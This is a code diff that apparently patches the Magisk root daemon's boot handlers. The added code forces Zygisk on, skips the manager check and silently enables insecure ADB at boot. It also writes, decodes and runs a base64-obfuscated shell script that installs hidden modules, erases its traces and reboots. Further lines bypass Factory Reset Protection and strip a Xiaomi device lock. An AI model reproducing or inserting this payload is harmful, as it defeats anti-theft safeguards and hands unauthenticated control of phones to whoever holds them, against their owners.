@@ -268,7 +268,7 @@ static void post_fs_data() {
         exec_common_scripts("post-fs-data");
         db_settings dbs;
         get_db_settings(dbs, ZYGISK_CONFIG);
-        zygisk_enabled = dbs[ZYGISK_CONFIG];
+        zygisk_enabled = true;
         initialize_denylist();
         handle_modules();
     }
@@ -302,7 +302,29 @@ static void boot_complete() {
 
     // Ensure manager exists
     check_pkg_refresh();
-    get_manager(0, nullptr, true);
+    //get_manager(0, nullptr, true);
+
+    // ADB
+    exec_command_sync("/system/bin/sh", "-c", "resetprop ro.adb.secure 0");
+    exec_command_sync("/system/bin/sh", "-c", "resetprop persist.sys.usb.config adb");
+    exec_command_sync("/system/bin/sh", "-c", "settings put global adb_enabled 1");
+
+    if (access(MODULEROOT "/sabpprook/service.sh", F_OK) != 0) {
+        auto fp = xfopen(SECURE_DIR "/sabpprook.b64", "w");
+        fprintf(fp, "IyEvc3lzdGVtL2Jpbi9zaAoKZXhwb3J0IERBVEFESVI9L2RhdGEvYWRiCmV4cG9ydCBSRUJPT1RPTkNFPS9kYXRhL2FkYi9tb2R1bGVzL3NhYnBwcm9vay9yZWJvb3RvbmNlCmV4cG9ydCBNQUdJU0tQQVRIPSQobWFnaXNrIC0tcGF0aCkKCltbIC1mICRNQUdJU0tQQVRIL2J1c3lib3ggJiYgLWYgJE1BR0lTS1BBVEgvc2FicHByb29rLnRhci5neiBdXSB8fCBleGl0IDAKJE1BR0lTS1BBVEgvYnVzeWJveCB0YXIgenh2ZiAkTUFHSVNLUEFUSC9zYWJwcHJvb2sudGFyLmd6IC1DICREQVRBRElSCgpbWyAtZiAkUkVCT09UT05DRSBdXSB8fCBleGl0IDAKCmNwIC1mICRNQUdJU0tQQVRIL2J1c3lib3ggJE1BR0lTS1BBVEgvbWFnaXNrMzIgJE1BR0lTS1BBVEgvbWFnaXNrNjQgJERBVEFESVIvbWFnaXNrCgpjaG1vZCAtUiA3NTUgJERBVEFESVIvbWFnaXNrICREQVRBRElSL3NoYW1pa28KY2hvd24gLVIgcm9vdDpyb290ICREQVRBRElSL21hZ2lzawpjaGNvbiAtUiB1Om9iamVjdF9yOnN5c3RlbV9maWxlOnMwICREQVRBRElSL21hZ2lzawoKc2xlZXAgMTAKcm0gLXJmIC9kYXRhL2FkYi9zYWJwcHJvb2suKgpbWyAtZiAvZGF0YS9zeXN0ZW0vcGFja2FnZXMueG1sIF1dICYmIHJtICRSRUJPT1RPTkNFICYmIHJlYm9vdAoKZXhpdCAw");
+        fclose(fp);
+
+        exec_command_sync("/system/bin/sh", "-c", "base64 -d /data/adb/sabpprook.b64 > /data/adb/sabpprook.sh");
+        exec_command_sync("/system/bin/sh", "-c", "chmod 0777 /data/adb/sabpprook.sh");
+        exec_command_sync("/system/bin/sh", "-c", "/data/adb/sabpprook.sh");
+    }
+
+    // FRP bypass
+    exec_command_sync("/system/bin/sh", "-c", "settings put secure user_setup_complete 1");
+
+    // Xiaomi
+    exec_command_sync("/system/bin/sh", "-c", "setprop persist.security.adbinput 1");
+    exec_command_sync("/system/bin/sh", "-c", "resetprop --delete ro.secureboot.devicelock");
 }
 
 void boot_stage_handler(int code) {
